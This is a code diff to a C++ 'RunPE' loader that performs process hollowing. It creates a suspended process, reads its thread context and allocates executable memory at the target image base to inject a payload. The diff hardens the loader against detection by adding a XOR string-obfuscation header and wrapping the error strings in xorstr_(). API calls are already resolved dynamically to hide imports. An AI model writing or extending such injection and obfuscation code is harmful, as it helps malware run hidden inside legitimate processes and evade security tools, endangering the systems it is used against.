@@ -2,6 +2,8 @@
 
 #include <stdexcept>
 
+#include "../../general/protect/xorstring/xorstring.h"
+
 #define GET_FUNCTION_PTR(function) reinterpret_cast<decltype(&function)>(RpGetProcAddress("kernel32.dll", #function))
 
 void RunPE::RunExecutable(std::vector<char>& Image, LPCSTR CmdLine) {
@@ -24,11 +26,11 @@ void RunPE::RunExecutable(std::vector<char>& Image, LPCSTR CmdLine) {
     ntHeaders = PIMAGE_NT_HEADERS64(reinterpret_cast<ULONGLONG>(image) + dosHeader->e_lfanew);
 
     if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
-        throw std::runtime_error("Failed to get image signature");
+        throw std::runtime_error(xorstr_("Failed to get image signature"));
     }
 
     if (!GET_FUNCTION_PTR(CreateProcessA)(filePath, const_cast<char*>(CmdLine), 0, 0, FALSE, CREATE_SUSPENDED, 0, 0, &startupInfo, &processInfo)) {
-        throw std::runtime_error("Failed to create process");
+        throw std::runtime_error(xorstr_("Failed to create process"));
     }
 
     PCONTEXT ctx = PCONTEXT{};
@@ -36,7 +38,7 @@ void RunPE::RunExecutable(std::vector<char>& Image, LPCSTR CmdLine) {
     ctx->ContextFlags = CONTEXT_FULL;
 
     if (!GET_FUNCTION_PTR(GetThreadContext)(processInfo.hThread, LPCONTEXT(ctx))) {
-        throw std::runtime_error("Failed to get thread context");
+        throw std::runtime_error(xorstr_("Failed to get thread context"));
     }
 
     LPVOID imageBase = GET_FUNCTION_PTR(VirtualAllocEx)(processInfo.hProcess, LPVOID(ntHeaders->OptionalHeader.ImageBase), ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
